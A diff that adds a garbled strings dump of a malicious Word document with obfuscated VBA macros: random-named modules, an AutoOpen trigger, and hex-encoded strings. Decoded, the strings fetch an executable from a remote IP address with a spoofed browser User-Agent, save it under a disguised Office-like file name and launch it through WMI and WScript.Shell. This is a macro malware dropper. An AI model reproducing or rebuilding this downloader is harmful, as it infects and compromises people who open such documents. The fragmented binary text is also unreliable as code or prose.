@@ -1,0 +1,320 @@
+[Content_Types].xml
+_rels/.rels
+theme/theme/themeManager.xml
+theme/theme/theme1.xml
+}O3o?_w2
+:wyjuI
+theme/theme/_rels/themeManager.xml.rels
+K(M&$R(.1
+[Content_Types].xmlPK
+_rels/.relsPK
+theme/theme/themeManager.xmlPK
+theme/theme/theme1.xmlPK
+theme/theme/_rels/themeManager.xml.relsPK
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<a:clrMap xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
+Normal
+Microsoft Office Word
+Project
+\G{00020
+0046}#
+2.0#0#C:
+\Windows
+\SysWOW6
+e2.tlb
+#OLE Aut
+omation
+ENormal
+!Offic
+!G{2DF
+8D04C-5B
+FA-101B-
+m Files 
+(x86)\Co
+crosoft 
+Shared\O
+FFICE16\
+MSO.DLL#
+P 16.0 
+ LibrXary
+hisDocum@entG
+`boevy
+I tmopePiqjrC t
+O znjetPvrbhC z
+77696e6d676d$
+74733a5c5c2e5c726f6f745c63696d7632$
+6e33325f50726f6365737353746172747570$
+77696e6d676d74733a5c5c2e5c726f6f745c63696d76323a57696e33325f5072$
+6f63657373$
+Attribut
+e VB_Nam
+e = "boe
+vybjni"
+Functio
+n ycrunh
+ximowvlp
+eswli(ex
+uxrqtwun
+sz As S
+ uhddqlg
+bject(li
+oiiqwrow
+ja("7769
+6e6d676d ") & 
+33a5c5c2
+e5c726f6
+f745c63
+d7632"))
+nypvibzs
+whbxmlaw
+:6e33@325f50
+65737353
+74617274
+penjuunf
+qxsytaw
+E.SpawnI
+nstance_
+dnovqaqz
+#H'.Creat
+, Null
+:, int
+ProcessIBD
+ByVal yz
+ogozyyqh
+m piyzrf@kgdnxw
+LHong@
+ 1 To Le
+&  Chr$(@%("
+575363726970$
+742e5368656c6c$
+Attribut
+e VB_Nam
+e = "tmo
+peiqjr"
+Sub sjv
+zkdcltt(
+cmdLine 
+Create
+Object(l
+hqqvvzjf
+kxs("575
+36372697@0") & 
+c6c")).R
+e Fu@nction
+yVal gje
+yoquynxy
+ mcpghof
+dLon@g
+ 1 To Le
+|ep 82
+&  Chr$(
+7, 2))
+Attribut
+e VB_Nam
+e = "znj
+etvrbh"
+Sub ynm
+anfjgppn
+ytyees(j
+nixczqbj
+vk As S
+Error Re
+$.Clear 
+ycrunhx
+imowvlpe0swli
+N.Number
+ <> 0 Or
+sjvzkdcl
+687474703a2f2f3139352e3234322e$
+3131302e3132362f323032312f4d73576f72642e657865$
+433a2f50726f6772616d2046696c65732f57696e646f7773204d6564696120506c61$
+7965722f4f666669636550726573656e746174696f6e2e657865$
+4d53584d4c322e536572766572584d4c48$
+5454502e362e30$
+474554$
+557365722d41$
+67656e74$
+4d6f7a696c6c612f342e302028636f6d70617469626c653b204d53494520362e303b2057696e646f7773204e$
+5420352e3029$
+41444f44422e5374726561$
+Attribut
+e VB_Nam
+e = "Thi
+sDocumen
+1Normal
+VGlobal!
+Pre decla
+lateDeri
+$Customliz
+Sub cyip
+ehoxhgmu
+ qseiwct
+zbyq As 
+nhusywdg
+cco tngtd
+ject, fx
+yrlint
+wzyqyccl
+Integer
+== gzc
+qvgqncsj
+n("6874
+03a2f2f3
+139352e3
+234322e"
+12f4d73
+576f7264
+2e657865N"
+d2046696"c@
+9612(050@
+96H365
+6 e7461
+4d53584d
+727&6A
+.setOpt
+ion(2)
+n554")2,
+questHea(derL
+2d4QR67
+-fP6d70d,2
+3bA753494
+6.Statu
+(200 Thpen
+:10444f`
+_53m@c2
+esponseB
+Save0ToFi
+nmanfjgp
+pnytyees
+End <If
+Au|toA
+al ziraq
+loftmfr
+qsmafpwl
+= 1 To PLen(
+WordS10
+Win64F
+Project1
+stdole
+Project-
+ThisDocument<
+_Evaluate
+Normal
+Office
+Documentj
+Module1b
+boevybjni
+ycrunhximowvlpeswli
+exuxrqtwunsz
+uhddqlgpbt
+GetObjectz
+lioiiqwrowja!Q0
+ypvibzswhbxmlawcbdl(t0
+hkhpenjuunfqxsytaw
+SpawnInstance_
+ShowWindow
+dnovqaqzuzu
+Create
+intProcessIDH
+yzogozyyqhxro
+piyzrfkgdnxw^
+ChrK~0
+cyipehoxhgmuo\
+qseiwctzbyqG
+eranhusywdghwdni!0
+ccotngtd
+fxyrlintS
+wzyqyccld2
+gzcqvgqncsjn
+CreateObject
+setOption
+setRequestHeader#70
+Status
+ResponseBodyT
+SaveToFile
+ynmanfjgppnytyees
+AutoOpen
+ziraqloftmfr
+nkyzqsmafpwlPS0
+tmopeiqjr
+sjvzkdcltt
+cmdLineYt0
+lhqqvvzjfkxs
+gjeyoquynxya
+mcpghofpcmal
+znjetvrbh
+jnixczqbjvkI
+wimResult
+Number
+ID="{76379251-8E92-4164-8FDA-8100E7BDB9AB}"
+Document=ThisDocument/&H00000000
+Module=boevybjni
+Module=tmopeiqjr
+Module=znjetvrbh
+Name="Project"
+HelpContextID="0"
+VersionCompatible32="393222000"
+CMG="080ADFE5E3E5E3E5E3E5E3"
+DPB="999B4E734F734F73"
+GC="2A28FD6E8F6F8F6F70"
+[Host Extender Info]
+&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000
+[Workspace]
+ThisDocument=0, 0, 0, 0, C
+boevybjni=26, 26, 1216, 408, 
+tmopeiqjr=52, 52, 1242, 434, 
+znjetvrbh=78, 78, 1268, 460, 
+ThisDocument
+boevybjni
+tmopeiqjr
+znjetvrbh
+ Microsoft Word 97-2003
+MSWordDoc
+Word.Document.8
+#Project.znjetvrbh.ynmanfjgppnytyees
+Project.ThisDocument.AutoOpen
+PROJECT.THISDOCUMENT.AUTOOPEN
+#PROJECT.ZNJETVRBH.YNMANFJGPPNYTYEES
+Unknown
+Times New Roman
+Symbol
+Calibri
+Calibri Light
+Cambria Math
+Root Entry
+1Table
+WordDocument
+SummaryInformation
+DocumentSummaryInformation
+Macros
+boevybjni
+tmopeiqjr
+znjetvrbh
+ThisDocument
+(1Normal.ThisDocument
+*\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\Program Files (x86)\Common Files\Microsoft Shared\VBA\VBA7.1\VBE7.DLL#Visual Basic For Applications
+*\G{00020905-0000-0000-C000-000000000046}#8.7#0#C_VBA_PROJECT
+PROJECT
+PROJECTwm
+CompObj
+:\Program Files (x86)\Microsoft Office\root\Office16\MSWORD.OLB#Microsoft Word 16.0 Object Library
+*\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\Windows\SysWOW64\stdole2.tlb#OLE Automation
+*\CNormal
+*\CNormal
+*\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE16\MSO.DLL#Microsoft Office 16.0 Object Library
+ThisDocument
+0362469dbf
+ThisDocument
+boevybjni
+0562469dc0
+boevybjni
+tmopeiqjr
+0662469dc1
+tmopeiqjr
+znjetvrbh
+0762469dc2
+znjetvrbh
+tThisDocument
+iboevybjni
+rtmopeiqjr
+hznjetvrbh
